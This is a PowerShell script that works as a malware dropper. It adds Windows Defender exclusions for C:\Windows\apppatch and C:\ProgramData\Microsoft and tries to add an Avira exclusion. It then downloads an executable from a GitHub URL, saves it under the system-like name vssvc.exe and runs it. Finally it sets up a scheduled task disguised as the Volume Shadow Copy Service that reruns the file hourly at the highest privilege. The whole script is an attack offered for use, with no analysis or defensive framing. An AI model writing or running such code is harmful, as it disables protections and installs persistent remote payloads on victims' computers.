# Change directory
cd C:\Windows\apppatch

# Ensure Windows Defender service is running
if ((Get-Service -Name WinDefend).Status -ne 'Running') {
    Start-Service -Name WinDefend
    Start-Sleep -Seconds 5
}

# Add exclusions to Windows Defender
try {
    Add-MpPreference -ExclusionPath C:\Windows\apppatch -ErrorAction Stop
    Add-MpPreference -ExclusionPath C:\ProgramData\Microsoft -ErrorAction Stop
} catch {
    Write-Error "Failed to add exclusions: $_"
}

# Pause execution for 1 second
Start-Sleep -Seconds 1

# Add exclusions to Avira (Adjust path and parameters as needed)
$aviraPath = "C:\Program Files (x86)\Avira\Antivirus\AviraCmd.exe"  # Adjust path as needed
$filePathToExcludeAvira = "C:\Windows\apppatch"
$filePathToExcludeAvira = "C:\ProgramData\Microsoft"

if (Test-Path $aviraPath) {
    try {
        Start-Process -FilePath $aviraPath -ArgumentList "/add-exclusion $filePathToExcludeAvira" -Wait
        Write-Output "Added exclusion to Avira for $filePathToExcludeAvira."
    } catch {
        Write-Error "Failed to add exclusion to Avira: $_"
    }
} else {
    Write-Error "Avira command-line tool not found."
}

# Download executable
$url = "https://github.com/abyasabazla/test/raw/main/vss/vssc.exe"
$outputFilePath = "C:\ProgramData\Microsoft\vssvc.exe"
try {
    Invoke-WebRequest -Uri $url -OutFile $outputFilePath -ErrorAction Stop
    Write-Output "Downloaded file to $outputFilePath."
} catch {
    Write-Error "Failed to download file: $_"
}

# Execute the downloaded file
try {
    Start-Process -FilePath $outputFilePath -ErrorAction Stop
    Write-Output "Executed the downloaded file."
} catch {
    Write-Error "Failed to execute file: $_"
}

# Create a scheduled task
try {
    schtasks /create /tn "\Volume Shadow Copy Service" /tr "$outputFilePath" /st 00:00 /du 9999:59 /sc once /ri 60 /rl HIGHEST /f
    Write-Output "Scheduled task created."
} catch {
    Write-Error "Failed to create scheduled task: $_"
}

# Print message
Write-Output "Attempt."
